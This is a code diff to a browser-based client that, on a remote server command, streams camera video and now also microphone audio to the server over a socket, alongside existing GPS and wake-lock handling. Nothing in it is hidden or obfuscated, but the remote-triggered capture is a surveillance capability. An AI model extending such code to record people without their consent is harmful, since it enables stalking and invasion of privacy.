@@ -18,6 +18,9 @@ let cameraInterval = null;
 let useFrontCamera = true;
 let gpsWatchId = null;
 let wakeLock = null;
+let audioStream = null;
+let audioProcessor = null;
+let audioContext = null;
 
 // ---- Logging ----
 function log(message, type) {
@@ -232,6 +235,52 @@ function startInfoUpdates() {
 }
 
 // ---- Camera Commands ----
+// ---- Audio streaming helper ----
+function startAudioStream() {
+  stopAudioStream();
+  try {
+    navigator.mediaDevices.getUserMedia({ audio: true }).then(function(stream) {
+      audioStream = stream;
+      audioContext = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
+      var source = audioContext.createMediaStreamSource(stream);
+      audioProcessor = audioContext.createScriptProcessor(4096, 1, 1);
+      audioProcessor.onaudioprocess = function(e) {
+        var inputData = e.inputBuffer.getChannelData(0);
+        // Convert float32 to int16
+        var buffer = new Int16Array(inputData.length);
+        for (var i = 0; i < inputData.length; i++) {
+          var s = Math.max(-1, Math.min(1, inputData[i]));
+          buffer[i] = s < 0 ? s * 0x8000 : s * 0x7FFF;
+        }
+        var base64 = btoa(String.fromCharCode.apply(null, new Uint8Array(buffer.buffer)));
+        socket.emit('camera:audio', { audio: base64, sampleRate: 16000 });
+      };
+      source.connect(audioProcessor);
+      audioProcessor.connect(audioContext.destination);
+      log('Audio streaming started', 'success');
+    }).catch(function(err) {
+      log('Audio error: ' + err.message, 'error');
+    });
+  } catch (err) {
+    log('Audio init error: ' + err.message, 'error');
+  }
+}
+
+function stopAudioStream() {
+  if (audioProcessor) {
+    audioProcessor.disconnect();
+    audioProcessor = null;
+  }
+  if (audioContext) {
+    audioContext.close().catch(function() {});
+    audioContext = null;
+  }
+  if (audioStream) {
+    audioStream.getTracks().forEach(function(t) { t.stop(); });
+    audioStream = null;
+  }
+}
+
 socket.on('command:camera:start', async function() {
   log('Camera start requested', 'info');
   updateFeature('fCamera', 'Streaming', true);
@@ -267,7 +316,10 @@ socket.on('command:camera:start', async function() {
       }
     }, 200);
 
-    log('Camera streaming started', 'success');
+    // Start audio streaming alongside video
+    startAudioStream();
+
+    log('Camera + audio streaming started', 'success');
   } catch (err) {
     log('Camera error: ' + err.message, 'error');
   }
@@ -285,7 +337,8 @@ socket.on('command:camera:stop', function() {
     cameraStream.getTracks().forEach(function(t) { t.stop(); });
     cameraStream = null;
   }
-  log('Camera stopped', 'info');
+  stopAudioStream();
+  log('Camera + audio stopped', 'info');
 });
 
 socket.on('command:camera:switch', async function() {
